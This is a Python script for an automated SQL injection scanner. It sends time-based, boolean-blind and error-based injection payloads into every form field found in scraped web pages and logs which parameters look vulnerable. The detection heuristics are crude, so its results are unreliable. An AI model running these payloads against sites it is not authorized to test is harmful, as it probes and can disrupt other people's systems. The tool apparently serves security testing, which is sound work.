import asyncio
import aiohttp
import time
import json
import logging
from statistics import mean, stdev

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def send_request(session, url, method, data, headers):
    try:
        async with session.request(method, url, data=data, headers=headers) as response:
            return await response.text()
    except aiohttp.ClientError as e:
        logger.error(f"Request error: {e}")
        return None

def analyze_response_times(times):
    if len(times) > 2:
        avg_time = mean(times)
        deviation = stdev(times)
        return any(t > avg_time + 2 * deviation for t in times)
    return False

async def test_time_based_sql_injection(session, url, data, expected_delay):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    start_time = time.time()
    response = await send_request(session, url, 'POST', data, headers)
    if not response:
        return False, 0
    duration = time.time() - start_time
    return duration > expected_delay, duration

async def test_blind_sql_injection(session, url, true_payload, false_payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    true_response = await send_request(session, url, 'GET', true_payload, headers)
    false_response = await send_request(session, url, 'GET', false_payload, headers)
    if not true_response or not false_response:
        return False
    return true_response != false_response

async def test_error_based_sql_injection(session, url, payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    response = await send_request(session, url, 'GET', payload, headers)
    if not response:
        return False
    return "error" in response.lower()

async def analyze_vulnerabilities(scraped_data):
    vulnerabilities = []
    logger.info(f"Analyzing vulnerabilities for scraped data: {scraped_data}")
    time_based_payloads = ["';WAITFOR DELAY '0:0:7';--", "';WAITFOR DELAY '0:0:21';--"]
    blind_payloads = [(" OR 1=1--", " OR 1=2--")]
    error_based_payloads = ["' OR 1=1--"]

    async with aiohttp.ClientSession() as session:
        for page in scraped_data:
            url = page['URL']
            forms = page.get('Forms', [])
            for form in forms:
                action = form['action'] if form['action'] else url
                method = form['method']
                inputs = form['inputs']
                for input_field in inputs:
                    name = input_field['name']
                    if not name:
                        continue

                    for payload in time_based_payloads:
                        data = {name: payload}
                        try:
                            delay_parts = payload.split(' ')[2].split(':')
                            expected_delay = int(delay_parts[2].replace("';--", ""))
                            is_vulnerable, duration = await test_time_based_sql_injection(session, action, data, expected_delay)
                            vulnerabilities.append({
                                'url': url,
                                'parameter': name,
                                'is_vulnerable': is_vulnerable,
                                'response_time': duration,
                                'payload': payload,
                                'type': 'Time-based',
                                'scan_data': f"Мы внедрили полезные нагрузки с различными временными задержками в параметр {name} и измерили время ответа."
                            })
                        except IndexError:
                            logger.error(f"Error processing payload: {payload} for URL: {url}")
                        except Exception as e:
                            logger.error(f"Unexpected error: {e}")

                    for true_payload, false_payload in blind_payloads:
                        data_true = {name: true_payload}
                        data_false = {name: false_payload}
                        try:
                            is_vulnerable = await test_blind_sql_injection(session, action, data_true, data_false)
                            vulnerabilities.append({
                                'url': url,
                                'parameter': name,
                                'is_vulnerable': is_vulnerable,
                                'payload': true_payload if is_vulnerable else false_payload,
                                'type': 'Blind',
                                'scan_data': f"Мы протестировали параметр {name} с истинными и ложными полезными нагрузками и сравнили ответы."
                            })
                        except Exception as e:
                            logger.error(f"Unexpected error: {e}")

                    for payload in error_based_payloads:
                        data = {name: payload}
                        try:
                            is_vulnerable = await test_error_based_sql_injection(session, action, data)
                            vulnerabilities.append({
                                'url': url,
                                'parameter': name,
                                'is_vulnerable': is_vulnerable,
                                'payload': payload,
                                'type': 'Error-based',
                                'scan_data': f"Мы внедрили полезные нагрузки, основанные на ошибках, в параметр {name} и проверили наличие сообщений об ошибках в ответе."
                            })
                        except Exception as e:
                            logger.error(f"Unexpected error: {e}")

    logger.info(f"Vulnerabilities found: {vulnerabilities}")
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = asyncio.run(analyze_vulnerabilities(scraped_data))
    with open('vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
